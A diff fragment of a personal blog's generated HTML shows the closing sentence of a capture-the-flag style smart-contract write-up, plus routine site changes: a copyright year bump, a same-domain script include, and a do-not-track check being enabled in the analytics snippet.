+</span></span><span class="line"><span class="cl">    <span class="n">validation</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>And we&rsquo;re done! We have drained the pool and stolen all DVT&rsquo;s
 from it.</p>
 <h2 id="summary-and-notes">
@@ -528,7 +522,7 @@ Governance with Smart Contracts</a> &ndash; Covers battle-tested practices and r
     
       1985 -
     
-    2025
+    2026
      Vasiliy Yorkin 
     
   </section>
@@ -544,6 +538,11 @@ Governance with Smart Contracts</a> &ndash; Covers battle-tested practices and r
   
 
   
+  
+  
+  <script src="https://vyorkin.org/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="></script>
+  
+  
 
   
 
@@ -552,7 +551,7 @@ Governance with Smart Contracts</a> &ndash; Covers battle-tested practices and r
       <script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
       <script>
         var doNotTrack = false;
-        if ( false ) {
+        if ( true ) {
           var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
           var doNotTrack = (dnt == "1" || dnt == "yes");
         }
